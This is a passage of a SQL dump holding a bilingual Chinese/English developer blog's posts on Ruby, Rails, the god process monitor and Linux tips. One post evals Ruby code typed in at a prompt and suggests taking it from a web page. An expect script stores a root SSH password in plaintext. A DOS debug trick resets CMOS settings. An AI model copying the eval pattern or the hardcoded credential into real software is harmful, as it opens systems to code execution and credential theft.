这个东东，所以我google了一下发现还有个 openstruct. &#160; ( today I am trying to write the unit test code in a gem project, but the difficulty is I have to refer a model defined in another project. I don\'t want to write a explicit class for this model.... so I googled \"ruby struct\" around, and found there is also an \'openstruct\' out there)&#160;</p>\r\n<p>两个都可以用。&#160;</p>\r\n<pre>require \'ostruct\'\r\nlala = OpenStruct(:name =&gt; \'lala\', :age =&gt; 30)\r\nlala.name #  =&gt; \'lala\'\r\nlala.age   # =&gt; 30\r\n\r\nclass Person &lt; Struct.new(:name, :age)\r\nend\r\ngirl = Person.new(\'lala\', 30)\r\ngirl.name    # =&gt; \"lala\"\r\ngirl.age  # =&gt; 30\r\n</pre>\r\n<p>\r\n\r\n基本的区别是： open struct 更加方便，一行代码搞定 。 但是运行的速度比 struct 要慢上100倍。 (both of them are fine for unit test, but open struct is 100x slower than struct when initializing. refer to: ) 见这里：  <a href=\"http://stackoverflow.com/questions/1177594/ruby-struct-vs-openstruct\" target=\"_blank\">http://stackoverflow.com/questions/1177594/ruby-struct-vs-openstruct</a>\r\n</p>',0,'2013-12-21 06:19:00','2013-12-21 06:28:10','2013-12-21 06:28:10',1,NULL,'ruby-struct-vs-open-struct','','','',466,'ruby-struct-vs-open-struct'),(163,'使用不同版本的rails 来建立新项目 (create rails project with a specific rails version)','<p>see: <a href=\"http://stackoverflow.com/questions/379141/specifying-rails-version-to-use-when-creating-a-new-application\" target=\"_blank\">http://stackoverflow.com/questions/379141/specifying-rails-version-to-use-when-creating-a-new-application</a> &#160;</p>\r\n<p>$ gem list -l rails&#160;</p>\r\n<p># =&gt; &#160;3.0.1, 4.0.1, 4.0.0</p>\r\n<p>$ rails _3.0.1_ new my_blog&#160;</p>\r\n<p>有趣的是， _3.0.1_ 是rubygem的用法，而不是rails 的用法。&#160;</p>',0,'2013-12-23 06:27:00','2013-12-23 06:30:18','2013-12-23 06:30:18',1,NULL,'create-rails-project-using-specific-rails-version','','','',415,'create-rails-project-using-specific-rails-version'),(164,'new feature in Rails4: Strong parameters (Rails4的新特性)','<p>今天开始了一个RAILS4的项目。 扑面而来的一个特性： strong parameter( today I started my first Rails 4 project and met the \"strong parameter\" feater)&#160;</p>\r\n<p>传统的rails 3 项目，需要在model中控制 可以访问的属性（in Rails 3, the attribute white list is controlled in model) ：</p>\r\n<pre># in models\r\nclass Plan &lt; ActiveRecord::Base\r\n    attr_accessible :name, :schedule\r\nend\r\n</pre>\r\n<p> 在Rails 4中，需要在controller中进行控制： ( but in Rails4, it\'s controlled in controller )&#160;</p>\r\n<pre># in controller:\r\nclass PlansController &lt; ApplicationController\r\n  before_action :set_plan, only: [:update]\r\n  def update\r\n    if @plan.update plan_params\r\n      redirect_to @plan, notice: \'Plan was successfully updated.\'\r\n    else\r\n      render action: \'edit\'\r\n    end\r\n  end\r\n  private\r\n    def set_plan\r\n      @plan = Plan.find(params[:id])\r\n    end \r\n    # this is the key! \r\n    def plan_params\r\n      params.require(:plan).permit :name, :schedule\r\n    end \r\n</pre>',0,'2013-12-23 08:05:00','2013-12-23 08:10:51','2013-12-23 08:10:51',1,NULL,'rails4-strong-parameters','','','',565,'rails4-strong-parameters'),(165,'web应用的稳定性是最重要的！( 24x7 online is the key for all the web-based applications)','<p>前几天我的个人服务器当了。停了大约3天。这三天我着实感觉很难受。。。当一个点子需要记录下来的时候，没有地方可以写。( This blog server went down on last Friday. It\'s really a hard time for me)</span>\r\n</p><p>现在好了，有教训了。需要做的是： (so the lesson I have is: 1. backup in time, always. 2. &#160;stabability is the most important )</span>\r\n</p><p>1。 及时备份</p>\r\n<p>2. &#160;宁可功能少，也要稳定。 （彻底抛弃花生壳）</p>\r\n<p>之前虽然也用过花生壳，但是发现民用电根本不稳定啊！ 没有个持续供电的机器，我们民用的PC能连续开机一个月就不错了。虽然配置可以很高，但是只要用户有一次发现网站打不开，就会认为我们的网站已经关门大吉了。绝对的损失。 &#160;( Though I have tried the \"nut shell\", it\'s not stable at all due to our \"civil electricity\". The users definitely think that our site is down forever when they found it down for 1 time. )&#160;</p>\r\n<p>所以，从花生壳转向linode还是非常值得的。 ( I am happy with Linode now. )</p>',0,'2014-01-04 00:14:00','2014-01-04 00:23:38','2014-01-04 00:23:38',1,NULL,'always-online-is-the-most-important','','','',375,'always-online-is-the-most-important'),(166,'Block basic in Ruby( Block 基础 ）','<p>以前虽然学习过block, proc, lambda, 但是一直没有大规模的使用。最近的项目让我不得不用到这个技术。但是遇到些问题。翻了书才知道原委。 (I have to review the \'block in Ruby\' because of one of my projects)</p>\r\n<p>一个例子： (a concise example)</p>\r\n<pre># no &amp;param in this method declaration because of the \"yield\"\r\n# 这个方法的参数声明中，没有 &amp;param 。因为方法体中已经有了 \"yield\"\r\ndef math(a, b)  \r\n    yield a,b \r\nend\r\n\r\ndef teach_match a, b, &amp;operator  \r\n  puts \" let\'s do the math: \"\r\n  puts math a, b, &amp;operator\r\nend\r\n\r\nteach_match(3, 5){ |x, y| x * y}  # =&gt; 15</pre>',0,'2014-01-05 00:16:00','2014-01-05 00:28:52','2014-01-05 00:29:49',1,NULL,'block-basic-in-ruby','','','',481,'block-basic-in-ruby'),(167,'lambda v.s. Proc.new (lambda 与 proc的区别）','<p>refer to: &lt;&lt;metaprogramming ruby&gt;&gt;, page 108~113.</p>\r\n<p>1. lambda中可以有显式的return , Proc不行。前者表示仅仅从当前的lambda中返回，而后者会出错 ( you can write return in lambda , but not in Proc.new. the former means return from a lambda an continue execute the code in the caller, but the latter means just return from the caller and will cause an error ) \r\nthe root cause is:  \r\n</p>\r\n<pre>def double callable_object\r\n  callable_object.call * 2\r\nend\r\n\r\nmy_block = lambda { return 10 }\r\ndouble my_block # =&gt; 20  \r\n\r\nmy_proc = Proc.new { 10 }\r\ndouble my_proc # =&gt; OK, 20 \r\n\r\nerror_proc = Proc.new { return 10 }\r\ndouble my_proc # =&gt;   unexpected return (LocalJumpError) \r\n</pre>\r\n\r\n<p>2. 对于Arity 的处理不同.  如果传入的参数跟 block声明的参数数量不同的话，lambda直接报错，而proc会容错。( lambda raises error if the arity is not match, but the Proc.new won\'t )&#160;</p>\r\n<pre>my_lambda = lambda { |x| return x }\r\nmy_lambda.call   # =&gt; Argument Error,   0 for 1\r\nmy_lambda.call(10) # =&gt; 10\r\nmy_lambda.call(10,20, 30 ) # =&gt; Argument Error,   3 for 1\r\n\r\nmy_proc = Proc.new { |x| x }\r\nmy_proc.call  # =&gt; nil\r\nmy_proc.call(10) # =&gt; 10\r\nmy_proc.call(10,20) # =&gt; 10\r\n</pre>',0,'2014-01-05 00:29:00','2014-01-05 00:45:31','2014-01-05 00:47:32',1,NULL,'lambda-v.s.-proc.new','','','',505,'lambda-v-s-proc-new'),(168,'ruby中的return ( the \'return\' keyword in Ruby)','<p>Ruby中的 return 还是有些学问的，平时用着看不出来，但是真到见真章的时候就考验功夫了：</p>\r\n\r\n\r\n<p>1. eval 中不能出现 return ,否则会报错 (LocalJumpError) </p>\r\n<p>2. Proc.new 中不能出现return, 出错也是 LocalJumpError </p>\r\n<p>3. lambda中可以return .  在caller method中之后继续执行</p>\r\n<p>4. 总则：  在ruby的某个方法中：如果最后一句不写return, 那么也默认return 它。</p>\r\n\r\n<pre>examples: \r\ndef give_me\r\n   # return \"your money\"\r\n  \"your money\"  \r\nend\r\n\r\neval \"1+1\" #=&gt; 2\r\neval \"a = 1+1; return a\" # =&gt; LocalJumpError\r\n\r\n</pre>\r\nsee also: <a href=\"http://siwei.me/blog/posts/lambda-v-s-proc-new\" target=\"_blank\"> http://siwei.me/blog/posts/lambda-v-s-proc-new </a>',0,'2014-01-05 00:55:00','2014-01-05 01:01:42','2014-01-05 01:01:42',1,NULL,'the-return-in-ruby','','','',496,'the-return-in-ruby'),(169,'如何输入一段ruby代码然后执行它？(how to input a string of ruby code and execute the code)','<p>there\'s a case that I have to input a string of ruby from console(or from even the web page) then execute it. here is the example: （如题。）</p>\r\n\r\n<pre>class UrlGenerator\r\n    attr_accessor :urls\r\n    def generate\r\n        @urls = yield\r\n    end \r\nend\r\n\r\nputs \"== input a block\"\r\n# input:  base_url = \"/base\" ;  switches = [1,2];     results = [] ;  switches.each { |i|   results &lt;&lt; \"#{base_url}/#{i}\"  };  results;\r\nblock_string = gets\r\nputs \"===== block_string: #{block_string}\"\r\nthe_block = lambda{eval(block_string)}\r\nputs \"== the block: #{the_block}\"\r\na = UrlGenerator.new\r\na.generate &amp;the_block\r\nputs \"==== urls: #{a.urls.inspect}\"\r\n\r\n</pre>\r\n\r\nrefer to: <a href=\"http://siwei.me/blog/posts/block-basic-in-ruby\" target=\"_blank\">http://siwei.me/blog/posts/block-basic-in-ruby</a>, <a href=\"http://siwei.me/blog/posts/the-return-in-ruby\" target=\"_blank\">http://siwei.me/blog/posts/the-return-in-ruby</a>',0,'2014-01-05 01:02:00','2014-01-05 01:07:44','2014-01-05 01:09:36',1,NULL,'how-to-input-a-string-of-ruby-code-and-then-call-it','','','',473,'how-to-input-a-string-of-ruby-code-and-then-call-it'),(170,'FLUXBB中批量删除用户和垃圾文章的办法remove spam users from fluxBB','<p>1. 搜索这个用户 （ 管理设置 -》 用户 -》 搜索， 使用 *这样的通配符)&#160;\r\n</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wNl80MTZfc3RlcDEucG5nBjoGRVQ/step1.png\" title=\"Step1\" alt=\"Step1\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>2. 得到了用户列表，注意下面的封禁或者删除按钮\r\n</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wN18xODNfc3RlcDIucG5nBjoGRVQ/step2.png\" title=\"Step2\" alt=\"Step2\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>3. 选择封禁的时候，注意 要让 “同时阻止IP地址” 选择 是。<img src=\"/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wN182MTZfc3RlcDMucG5nBjoGRVQ/step3.png\" title=\"Step3\" alt=\"Step3\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>4. 也可以直接删掉它们。</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSImMjAxNC8wMS8wNy8yM180OV8wOF8yNDNfc3RlcDUucG5nBjoGRVQ/step5.png\" title=\"Step5\" alt=\"Step5\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>',0,'2014-01-07 23:48:00','2014-01-07 23:51:14','2014-01-07 23:53:59',1,NULL,'remove-spam-users-from-fluxbb','','','',1449,'remove-spam-users-from-fluxbb'),(171,'一个expect 的例子 (an expect example  )','<p>expect是一个非常好用， 但是可读性很差的东西。 所以我把一个简单的例子记录在这里： (expect is an automation tool, it\'s quite useful, at the same time, it grammer is quite un-readable. here is an example: )</p>\r\n<pre>#expect 自动输入密码的脚本： （服务器地址是： 10.103.13.73, 用户名 root, 密码 redAPPLE\'\r\n\r\n#!/usr/bin/expect\r\nset timeout 100\r\nsystem echo \'password: redAPPLE\'\r\nspawn ssh root@10.103.13.73 -p 22022\r\nexpect password\r\nsend \"redAPPLE\\r\"\r\ninteract \r\n</pre>\r\n<p>最后的那个interact 非常重要！ &#160;任何一个都不可或缺。 &#160; ( don\'t forget the last line! )&#160;</p>',0,'2014-01-08 10:45:00','2014-01-08 10:49:10','2014-01-08 10:49:10',1,NULL,'expect-command-example','','','',499,'expect-command-example'),(172,'mac上安装大菠萝3 （install diablo3 on Mac)','<p>居然不是双击鼠标就可以安装的？ 要不要在MAC上发生这个事儿。。。</p>\r\n<p>(the background music is so worse than diablo1\'s )</p>\r\n<p>(in short: &#160;chmod +x to this file:&#160;Diablo-III-8370-enUS-Installer/Diablo III Setup.app/Contents/MacOS)</p>\r\n<p>1. 打開終端<br />2. 使用CD命令到達Diablo-III-8370-enUS-Installer/Diablo III Setup.app/Contents/MacOS目錄. 如果不會使用cd命令, 在終端中使用<br />help cd<br />查看幫助.<br />3. 使用chmod指令爲\"Diablo III Setup\"添加可執行屬性. 如果不會使用chmod命令, 在終端中使用<br />man chmod<br />查看幫助.<br />4. 運行\"Diablo III Setup\".</p>',0,'2014-01-08 11:45:00','2014-01-08 11:50:49','2014-01-08 11:50:49',1,NULL,'install-diablo3-on-mac','','','',472,'install-diablo3-on-mac'),(173,'rails activerecord 中的 insert  ( why array.insert works in Ruby but not in Rails?)','<p>因为 Rails 中返回的是 ActiveRecord.relationship, &#160;而不是raw Array.</p>\r\n<pre>e.g.\r\n# in irb\r\n[2,3,4].insert(1, \'a\') # =&gt; [2,\'a\', 3, 4]\r\n\r\n# in Rails\r\nmodels = SomeModel.where(...)\r\nmodels.insert(1,\'b\')  # wrong argument: 2 for 1 \r\nmodels.to_a.insert(1,\'b\')  # good \r\n</pre>',0,'2014-01-09 03:39:00','2014-01-09 03:42:29','2014-01-09 03:42:29',1,NULL,'why-array-insert-not-works-in-rails','','','',415,'why-array-insert-not-works-in-rails'),(174,'obtrusive js v.s. unobtrusive js','<p>obtrusive js:</span>\r\n</p><p>&lt;div onclick=\'alert(\"hihihi\"); a = 1+1; c = 2*2; \' &gt; some text here &lt;/div&gt;<br />1. 难于查看（特别是多行代码） &#160; &#160;( hard to view the code)<br />2. 难于单元测试 &#160; ( hard to write unit test)<br />3. JS 跟ＨＴＭＬ 混在了一起。 ( mixed js with html... )</p>\r\n<p>unobtrusive js: （含蓄ＪＳ）</p>\r\n<p>&lt;div class=\'alert_hi\'&gt;</span>some text here&lt;/div&gt;<br />&lt;div class=\'alert_hi\'&gt; anotherr text ehrre.... &lt;/div&gt;</p>\r\n<p>&lt;script&gt;<br />$(\'.alert_hi\').onclick = function (){ alert(\'hihihi\') }</span>\r\n<br />&lt;/script&gt;</p>\r\n<p>1. 解耦： ＪＳ 代码与ＨＴＭＬ代码 &#160;(decoupled js and html)</span>\r\n<br />2. 方便单元测试。 (比如上面，直接对ＦＯＯ进行测试 ） &#160;(easy to test)<br />3. 提高代码复用程度。 &#160;(easy to reuse)<br />4. 高手都这么用。 ( js gurus way)&#160;<br /></p>',0,'2014-01-10 02:40:00','2014-01-10 02:45:05','2014-01-10 02:45:05',1,NULL,'obtrusive-js-vs-unobtrusive-js','','','',862,'obtrusive-js-vs-unobtrusive-js'),(175,'我的一点提高英语水平的经验( how to improve your English? )','<p>今天有个帖子，很有趣。我看到有位朋友在一个JD的留言中，说自己英语不好， (<a href=\"http://ruby-china.org/topics/16318\">http://ruby-china.org/topics/16318</a>)</p>\r\n<p>我替他觉得很可惜。</p>\r\n<p>他似乎比较羡慕我在MOTO的工作经历， 认为这对我的英文有好处。实际上，我的英文一直都不好（高考分不低，不过大学四年没背过单词。唉）。只是可以勉强跟人交流软件开发。</p>\r\n<p>要我总结的话，我想说三句：</p>\r\n<p>1. MOTO的三年对我的英文基本没提高。因为身边都是中国人。</p>\r\n<p>2. 过去5年，我从来都坚持看英文官方文档( 也翻译过 velocity, <a href=\"http://siwei.me:82/docs_for_checkstyle.html\">checkstyle的文档</a>）。有了问题也第一时间搜索英文答案。在stackoverflow上用英文回答问题（嘿嘿还没见过分数比我高的 。我的stackoverflow 个人档案在 siwei.me的首页可以看到 &#160;）. &#160;</p>\r\n<p>然后，让自己英文提高最快的是：2年前读了两本英文原版书： &#160;&lt;&lt; meta programming ruby&gt;&gt; 和 &lt;&lt;coffeescript &gt;&gt; . &#160;第一本用了2个月，第二本用了3个星期。读完之后英语阅读基本无压力。</p>\r\n<p>口语一直很烂，跟美国友人一起吃饭的话，没法为他们介绍各种食物的来历，各种中国民间习俗。 稍微及格的是可以基本无障碍的交流软件开发。</p>\r\n<p>3. 英语不好不要着急，只要你抱有一颗学习的心，每天看上2，3页原版，把里面的每个生词都标注出来，一个一个的标音标，写注释，在周末 写写生词， 温习下大学英语， &#160; 我相信读完几本书之后你就完全可以去美国 H1B 工作了。</p>\r\n<p>《重构》的作者熊节一直是我的榜样。他当初也是一个小吊丝，人生的起步比我们还困难，但是他能够辛辛苦苦的每天努力，05年翻译完《重构》， 然后06年左右翻译《人件》 ，《WITHOUT EJB》 等很多经典书籍，一点一点的成长，现在是thoughtworks 成都分公司的负责人。觉得学习困难的时候，想想他当初的艰难。</p>\r\n<p>最后上一张照片，希望对这位朋友 @mvj3 &#160; 有帮助：</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI0MjAxNC8wMS8xMi8xMl8wMF81NV8zNTJfSU1HXzIwMTQwMTEyXzE5NDYyMS5qcGcGOgZFVA/IMG_20140112_194621.jpg\" title=\"Img 20140112 194621\" alt=\"Img 20140112 194621\" rel=\"225x255\" width=\"900\" height=\"1602\" /></p>',0,'2014-01-12 11:39:00','2014-01-12 11:48:51','2014-01-12 12:36:58',1,NULL,'how-to-improve-your-english','','','',622,'how-to-improve-your-english'),(176,'god 初体验 ( my first experience of god) ','<p>最近的一个项目需要用WEB 来控制 后台运行的进程。 搜索未果，于是在stackoverflow上发了个帖子(<a href=\"http://stackoverflow.com/questions/21069839/whats-the-best-practice-to-control-linux-process-from-web-page-rails\" target=\"_blank\">http://stackoverflow.com/questions/21069839/whats-the-best-practice-to-control-linux-process-from-web-page-rails</a>)。 &#160; 同时看到有人推荐<a href=\"godrb.com\" target=\"_blank\">godrb.com</a> ，所以试了一下。</p>\r\n<p>据说这个组建可以很好的控制进程的运行，加上各种监控。所以我试了试:&#160;</p>\r\n<pre># /sg552/workspace/test_god/test.rb\'\r\n  2 loop do\r\n  3   puts \'hi\'\r\n  4   sleep 2\r\n  5 end\r\n\r\n# god script\r\nGod.watch do |w| \r\n  w.name = \'hi\'\r\n  w.start = \'ruby /sg552/workspace/test_god/test.rb\'\r\n  w.keepalive\r\nend\r\n\r\n# ouput on ubuntu\r\nsg552@youku:/sg552/workspace/test_god$ god -c hi.god -D\r\nI [2014-01-13 18:12:22]  INFO: Loading hi.god\r\nI [2014-01-13 18:12:22]  INFO: Syslog enabled.\r\nI [2014-01-13 18:12:22]  INFO: Using pid file directory: /home/sg552/.god/pids\r\nI [2014-01-13 18:12:22]  INFO: Socket already in use\r\nI [2014-01-13 18:12:22]  INFO: Socket is stale, reopening\r\nI [2014-01-13 18:12:22]  INFO: Started on drbunix:///tmp/god.17165.sock\r\nI [2014-01-13 18:12:22]  INFO: hi move \'unmonitored\' to \'up\'\r\nI [2014-01-13 18:12:22]  INFO: hi moved \'unmonitored\' to \'up\'\r\nI [2014-01-13 18:12:22]  INFO: hi [trigger] process is not running (ProcessRunning)\r\nI [2014-01-13 18:12:22]  INFO: hi move \'up\' to \'start\'\r\nI [2014-01-13 18:12:22]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb\r\nI [2014-01-13 18:12:22]  INFO: hi moved \'up\' to \'up\'\r\n\r\n</pre>\r\n<p>god 的NB之处，在于它可以每5秒钟就检测一下对应的进程。 例如，我们看一下目前的进程情况: &#160;</p>\r\n<pre># notice the pid of: 1875,   \r\nsg552@youku:/sg552/workspace/test_god$ ps -ef | grep god\r\nsg552     1702 23782  0 18:20 pts/1    00:00:00 /home/sg552/.rbenv/versions/1.9.3-p327/bin/ruby /home/sg552/.rbenv/versions/1.9.3-p327/bin/god -c hi.god -D\r\nsg552     1875     1  0 18:23 ?        00:00:00 ruby /sg552/workspace/test_god/test.rb\r\nsg552     1885  1763  0 18:24 pts/2    00:00:00 grep --color=auto god\r\n</pre>\r\n<p>1875 就是god帮我们启动的test.rb 进程，  我们把它干掉试试。。。&#160;</p>\r\n<pre>$ kill -9 1875 \r\n# 这个时候， god的输出页面，就会这样， 很神奇吧？：\r\nI [2014-01-13 18:24:13]  INFO: hi [trigger] process is not running (ProcessRunning)\r\nI [2014-01-13 18:24:13]  INFO: hi move \'up\' to \'start\'\r\nI [2014-01-13 18:24:13]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb\r\nI [2014-01-13 18:24:13]  INFO: hi moved \'up\' to \'up\'\r\n\r\n# 可以看到，它又被启动起来了。\r\nsg552@youku:/sg552/workspace/test_god$ ps -ef | grep test.rb\r\nsg552     1376 23997  0 18:09 pts/4    00:00:00 vim test.rb\r\nsg552     1889     1  0 18:24 ?        00:00:00 ruby /sg552/workspace/test_god/test.rb\r\nsg552     1901  1763  0 18:27 pts/2    00:00:00 grep --color=auto test.rb\r\n</pre>\r\n\r\n<p> 看看GOD是如何控制CPU和内存的使用量的：</p>\r\n<pre># 这个脚本比较猛： test.rb\r\n  1 data = \'\'\r\n  2 loop do\r\n  3   puts \'hi\'\r\n  4   100000.times { data &lt;&lt; \'x\'}\r\n  5 end\r\n\r\n# hi.god\r\nGod.watch do |w| \r\n  w.name = \'hi\'\r\n  w.start = \'ruby /sg552/workspace/test_god/test.rb\'\r\n  w.keepalive(:memory_max =&gt; 150.megabytes, :cpu_max =&gt; 50.percent )\r\nend\r\n\r\n# 重启GOD， 之后，发现CPU越来越高的时候， GOD就会重启这个进程。 \r\nI [2014-01-13 18:48:33]  INFO: hi [trigger] cpu out of bounds [9.345794392462356%%, *84.27876823360998%%, *91.39307897056767%%, *94.0134392181086%%] (CpuUsage)\r\nI [2014-01-13 18:48:33]  INFO: hi move \'up\' to \'restart\'\r\nI [2014-01-13 18:48:33]  INFO: hi stop: default lambda killer\r\nI [2014-01-13 18:48:33]  INFO: hi sent SIGTERM\r\nI [2014-01-13 18:48:33]  INFO: hi process stopped\r\nI [2014-01-13 18:48:33]  INFO: hi start: ruby /sg552/workspace/test_god/test.rb\r\nI [2014-01-13 18:48:33]  INFO: hi moved \'up\' to \'up\'\r\n\r\n# 干掉这个进程：\r\n$ god stop hi\r\n\r\n</pre>\r\n<p>一些其他的常见问题：</p>\r\n<p>$ god stop hi &#160;# 停止 hi 这个任务（进程）</p>\r\n<p>$ god quit # 彻底停止god</p>\r\n<p>$ god status # 查看god的状态</p>\r\n\r\n',0,'2014-01-13 10:15:00','2014-01-13 10:18:05','2014-01-14 00:54:38',1,NULL,'first-experience-of-god','','','',500,'first-experience-of-god'),(177,'god进阶： 配置文件( god advanced: config file) ','参考（refer to )<a href=\"http://godrb.com/\" target=\"_blank\">http://godrb.com/</a>\r\n<p> 每一个watch都代表一个process.    如果你有多个watch(process), 需要为每个process 分别指定pid_file. (If the process you\'re watching runs as a daemon (as mine does), you\'ll need to set the pid_file attribute.) </p>\r\n<p> 如果没有提供restart ， 那么god会很聪明的先stop, 再执行start  (god is smart enought to \'restart\' by calling \'stop\', \'start\' if \'restart\' command is not provided. ) </p>\r\n\r\n<p> 可以以daemon 形式启动的process: (config files for those process that could be start as daemon ) </p>\r\n<pre># 注意： 对于可以以 daemon 形式执行的命令，用这个格式（注意其中的 restart, pid_file )   \r\nGod.watch do |w|\r\n  w.name = \"gravatar2-mongrel-#{port}\"\r\n\r\n  w.start = \"mongrel_rails start -c #{RAILS_ROOT} -p #{port} \\\r\n    -P #{RAILS_ROOT}/log/mongrel.#{port}.pid  -d\"\r\n  w.stop = \"mongrel_rails stop -P #{RAILS_ROOT}/log/mongrel.#{port}.pid\"\r\n  w.restart = \"mongrel_rails restart -P #{RAILS_ROOT}/log/mongrel.#{port}.pid\"\r\n\r\n  w.pid_file = File.join(RAILS_ROOT, \"log/mongrel.#{port}.pid\")\r\n\r\n  # 这个是内置的命令，在启动之前，清理残存的PID文件 \r\n  w.behavior(:clean_pid_file)  \r\n  ...\r\nend\r\n\r\n</pre>\r\n\r\n<p>注意：对于 无法以 daemon  形式执行的process（只能以 nohup .. .&amp; 的形式启动）， 要用这样的配置文件： ( we should use this config file if the process could not be run as daemon except using \"nohup...&amp;\") </p>\r\n<pre># 注意： 不要有 stop, pid_file 以及 behavior 这三个东东。   \r\n# (NOTICE: don\'t use stop, pid_file and behavior ) \r\nRAILS_ROOT = \'/sg552/workspace/m-video-fetcher\'\r\nPID_FILE = RAILS_ROOT + \'/tmp/pids/fetcher.pid\'\r\nCOMMAND = \"cd #{RAILS_ROOT} &amp;&amp; ruby script/start_fetch.rb\"\r\nputs COMMAND\r\nGod.watch do |w| \r\n  w.name = \'fetcher\'\r\n  w.dir = RAILS_ROOT\r\n  w.start = \"ruby script/start_fetch.rb\"\r\n#  w.stop = \"kill -9 $(cat #{PID_FILE})\"\r\n#  w.pid_file = PID_FILE\r\n#  w.behavior :clean_pid_file\r\n  w.log = \"#{RAILS_ROOT}/fetcher.log\"\r\n  w.keepalive\r\nend\r\n\r\n</pre>',0,'2014-01-14 00:20:00','2014-01-14 00:51:10','2014-04-03 00:29:51',1,NULL,'god-advanced-config-file','','','',464,'god-advanced-config-file'),(178,'kill 与 cat一起使用，干掉某个进程 (kill a process by its pid file) ','<p>refer to : <a href=\"http://mindspill.net/computing/linux-notes/kill-a-process-from-pid-file/\" target=\"_blank\">http://mindspill.net/computing/linux-notes/kill-a-process-from-pid-file/</a> </p>\r\n<p>kill -9 $(cat tmp/pids/mongrel.pid)</p>',0,'2014-01-14 01:19:00','2014-01-14 01:21:44','2014-01-14 01:21:44',1,NULL,'kill-process-by-pid-file','','','',409,'kill-process-by-pid-file'),(179,'RAILS中如何测试 private method. ( how to test private methods in Rails. )','<p>\r\nmodify your spec_helper.rb and add the code below: \r\n</p>\r\n<pre>#  for testing the private method.\r\n#  EXAMPLE:\r\n#  describe_private User do\r\n#    describe \"about the role-permission\" do\r\n#      it \"should ...\" do\r\n#        true.should == true\r\n#      end\r\n#    end\r\n#  end\r\n#  p.s. for another approach, please use: myobject.send(:method_name, args)\r\n#  see:\r\n#  http://stackoverflow.com/questions/267237/whats-the-best-way-to-unit-test-protected-private-met\r\ndef describe_private *args, &amp;block\r\n  example = describe *args, &amp;block\r\n  clazz = args[0]\r\n  if clazz.is_a? Class\r\n    saved_private_instance_methods = clazz.private_instance_methods\r\n    example.before do\r\n      clazz.class_eval { public *saved_private_instance_methods }\r\n    end \r\n    example.after do\r\n      clazz.class_eval { private *saved_private_instance_methods }\r\n    end \r\n  end \r\nend\r\n</pre>\r\n<p>refer to: <a href=\"http://sg552.iteye.com/blog/758130\" target=\"_blank\">http://sg552.iteye.com/blog/758130</a>\r\n</p>',0,'2014-01-18 02:46:00','2014-01-18 02:48:49','2014-01-18 02:49:35',1,NULL,'test-private-method-in-rails','','','',384,'test-private-method-in-rails'),(180,'windows下如何重置bios (how to reset bios under windows)','<p>太不容易了。今天折腾了我一个早上。 (this morning I fixed this problem by using the \'debug\' command under DOS. )</p>\r\n<p>我的笔记本从来都是 无法进入BIOS， 只能每次都是进入一个莫名其妙的windows loader 还是什么东东。我把硬盘拆了都不管用。(my laptop is not able to enter the bios and install ubuntu because of a strange windows load manager or so. It could not be removed even if the harddisk is removed. )</p>\r\n<p>查了一早上。发现时 现在的主板，一般使用UEFI/EFI 来取代原来的 BIOS。 我郁闷。无法搞定啊。 (after google around for 2 hours , not solution found)&#160;</p>\r\n<p>把CMOS电池拆了也没用。&#160;</p>\r\n<p>后来找到个光盘，进入了WIN PE， (at last, I found a windows boot CD and enter the win PE , which supports DOS command)&#160;</p>\r\n<p>因为刚才搜索的时候，看到有帖子说 debug -o 的那个命令可以给CMOS 放电。（也想起了自己高中时候，在电脑课上用同样的方法给学校的机房换密码，改背景桌面，匿名留言说自己是黑客，全年级的同学都看到了哈哈） 于是试了一下，太爽了啊。</p>\r\n<p>步骤： ( so I tried this command and successfully enter my bios :)&#160;</p>\r\n<pre>$ debug\r\n-o 70 16\r\n-o 71 16\r\n-q \r\n</pre>\r\n<p>爽歪歪了有木有！ &#160;(oh yeah! )</p>',0,'2014-01-19 03:01:00','2014-01-19 03:09:27','2014-01-19 03:09:27',1,NULL,'how-to-reset-bios-under-windows','','','',491,'how-to-reset-bios-under-windows'),(181,'command not found error( UBUNTU下很奇怪的错误）','<p>今天发现服务器上出现了这个错误。 (today I met this error on my personal server)&#160;</p>\r\n<p>GOOGLE一下，没搞定（参考 <a href=\"http://www.thattommyhall.com/2012/12/12/sorry-command-not-found-has-crashed/\" target=\"_blank\">http://www.thattommyhall.com/2012/12/12/sorry-command-not-found-has-crashed/</a> ) &#160;(this post doesn\'t help me)&#160;</p>\r\n\r\n<p> 后来看到这个帖子 (<a href=\"http://blog.csdn.net/miyuehu/article/details/12039347\" target=\"_blank\">http://blog.csdn.net/miyuehu/article/details/12039347</a>)受到了启发，觉得需要从 没找到的命令 入手，所以发现是rbenv, gem, bundle都失效了。 于是查看 $PATH,  发现 $PATH 设置的不对，里面包含了一段错误的PATH。 改掉之后就好了。 ( I got some clues from the link of this paragraph, and found that my rbenv and its related command are broken. &#160;and further more, my $PATH variable is broken . so I fixed this problem by correcting the $PATH in my ~/.bashrc file)&#160;</p>\r\n\r\n<pre>root@li539-250:/opt# echo $PATH  # there\'s no /opt/mongodb... folder. \r\n/root/.rbenv/shims:/root/.rbenv/bin:/opt/mongodb-linux-i686-2.4.5/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\r\n\r\nafter correction:\r\n$ echo $PATH\r\n/root/.rbenv/shims:/root/.rbenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\r\n\r\n</pre>\r\n',0,'2014-01-20 12:28:00','2014-01-20 12:35:41','2014-01-20 12:35:41',1,NULL,'command-not-found-error','','','',432,'command-not-found-error'),(182,'如何成为weixin开放平台的开发者（how to become a developer on weixin open-platform)','<p>1。几个概念： &#160;</p>\r\n<p>微信公众平台（ <a href=\"https://mp.weixin.qq.com/\" target=\"_blank\">https://mp.weixin.qq.com/</a>) &#160;我们用的是这个。 在它上面申请服务号，订阅号等。 它提供了很多方便的接口。 也有一个简单的操作后台。</p>\r\n<p>微信开发者平台 (<a href=\"http://open.weixin.qq.com/\" 